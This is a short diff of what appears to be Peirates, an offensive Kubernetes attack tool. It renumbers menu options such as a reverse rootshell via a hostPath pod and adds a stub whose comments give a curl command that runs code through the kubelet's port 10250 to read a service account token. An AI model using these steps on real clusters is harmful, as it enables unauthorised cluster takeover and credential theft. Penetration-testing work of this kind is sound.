@@ -938,7 +938,7 @@ Compromise |
 -----------+
 [20] Gain a reverse rootshell by launching a hostPath / pod
 [21] Run command in one or all pods in this namespace
-[22] Run a command in a pod via a Kubelet [not yet implemented]
+[22] Get a list of pods from the Kubelet [not yet implemented]
 
 -----+
 Misc |
@@ -1252,7 +1252,7 @@ Peirates:># `)
 			break
 
 		// [16] Pull Kubernetes service account tokens from S3 [AWS only]
-		case "17":
+		case "16":
 			// Create a new HTTP client that uses the correct headers
 			// client := &http.Client{}
 
@@ -1447,6 +1447,18 @@ Peirates:># `)
 				}
 
 			}
+		// [22] Get a list of pods from the Kubelet [not yet implemented]
+		case "22":
+			// Use kubectl get nodes to get a list of nodes
+			// Use kubectl get node _name_ -o yaml to get IP addresses
+			// Find a line that matches - address: IP
+			// curl port 10255 to get pods: curl -sk http://10.23.58.41:10255/pods
+			// Parse the Json to get pod and container names
+			// curl port 10250 to run commands:
+			// curl -sk https://10.23.58.41:10250/run/namespace/pod/container/ \
+			// -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token"
+
+			break
 		case "98":
 			break
 		case "99":
